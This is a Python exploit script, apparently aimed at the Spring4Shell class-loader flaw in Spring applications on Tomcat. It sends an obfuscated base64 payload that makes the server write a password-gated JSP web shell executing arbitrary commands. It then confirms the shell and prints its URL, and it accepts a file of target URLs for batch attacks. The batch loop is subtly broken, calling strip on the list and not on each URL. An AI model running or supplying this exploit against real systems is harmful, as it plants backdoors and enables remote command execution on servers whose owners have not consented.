#-*- coding: utf-8 -*-

import sys
import fire
import base64
import requests

def exploit(url):
    headers = {
               "prefix":"<%",
               "suffix":"%>",
               "rt":"Runtime",
               "User-Agent": "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:56.0) Gecko/20100101 Firefox/56.0",
               "Content-Type":"application/x-www-form-urlencoded"
    }
    payload = base64.b64decode(b"Y2xhc3MubW9kdWxlLmNsYXNzTG9hZGVyLnJlc291cmNlcy5jb250ZXh0LnBhcmVudC5waXBlbGluZS5maXJzdC5wYXR0ZXJuPSUyNSU3QnByZWZpeCU3RGklMjBpZiUyOCUyMnNwcmluZyUyMi5lcXVhbHMlMjhyZXF1ZXN0LmdldFBhcmFtZXRlciUyOCUyMnB3ZCUyMiUyOSUyOSUyOSU3QiUyMGphdmEuaW8uSW5wdXRTdHJlYW0lMjBpbiUyMCUzRCUyMCUyNSU3QnJ0JTdEaS5nZXRSdW50aW1lJTI4JTI5LmV4ZWMlMjhyZXF1ZXN0LmdldFBhcmFtZXRlciUyOCUyMmNtZCUyMiUyOSUyOS5nZXRJbnB1dFN0cmVhbSUyOCUyOSUzQiUyMGludCUyMGElMjAlM0QlMjAtMSUzQiUyMGJ5dGUlNUIlNUQlMjBiJTIwJTNEJTIwbmV3JTIwYnl0ZSU1QjIwNDglNUQlM0IlMjBvdXQucHJpbnQlMjglMjIlM0NwcmUlM0UlMjIlMjklM0IlMjB3aGlsZSUyOCUyOGElM0Rpbi5yZWFkJTI4YiUyOSUyOSUyMSUzRC0xJTI5JTdCJTIwb3V0LnByaW50bG4lMjhuZXclMjBTdHJpbmclMjhiJTI5JTI5JTNCJTIwJTdEJTIwJTdEJTIwb3V0LnByaW50JTI4JTIyJTNDJTJGcHJlJTNFJTIyJTI5JTNCJTIwJTI1JTdCc3VmZml4JTdEaSZjbGFzcy5tb2R1bGUuY2xhc3NMb2FkZXIucmVzb3VyY2VzLmNvbnRleHQucGFyZW50LnBpcGVsaW5lLmZpcnN0LnN1ZmZpeD0uanNwJmNsYXNzLm1vZHVsZS5jbGFzc0xvYWRlci5yZXNvdXJjZXMuY29udGV4dC5wYXJlbnQucGlwZWxpbmUuZmlyc3QuZGlyZWN0b3J5PXdlYmFwcHMlMkZST09UJmNsYXNzLm1vZHVsZS5jbGFzc0xvYWRlci5yZXNvdXJjZXMuY29udGV4dC5wYXJlbnQucGlwZWxpbmUuZmlyc3QucHJlZml4PXNoZWxsJmNsYXNzLm1vZHVsZS5jbGFzc0xvYWRlci5yZXNvdXJjZXMuY29udGV4dC5wYXJlbnQucGlwZWxpbmUuZmlyc3QuZmlsZURhdGVGb3JtYXQ9").decode()
    print(f"[Start] URL: {url}")
    try:
        exploit_response = requests.post(url, headers=headers, data=payload, timeout=15, allow_redirects=False, verify=False)
        shell_url = "/".join(url.split("/", 3)[:3]) + '/shell.jsp'
        shell_reponse = requests.get(shell_url,timeout=15,allow_redirects=False, verify=False)
        if shell_reponse.status_code != 404:
            if shell_reponse.status_code == 200:
                print(f"[Success] Shell url: {shell_url}?pwd=spring&cmd=whoami")
            else:
                print(f"[Failed] Status Code: {shell_reponse.status_code} URL:{shell_url}?pwd=spring&cmd=whoami")
        else:
            print("Exploit failed.")
    except Exception as e:
        print("[Error]", e)

def main(url="", file=""):
    if url:
        exploit(url)
    elif file:
        with open(file, "r") as f:
            urls = f.readlines()
        for url in urls:
            exploit(urls.strip())
    else:
        print(f"usege: {sys.argv[0]} [--url] url [--file] file_path")

if __name__ == '__main__':
    fire.Fire(main)
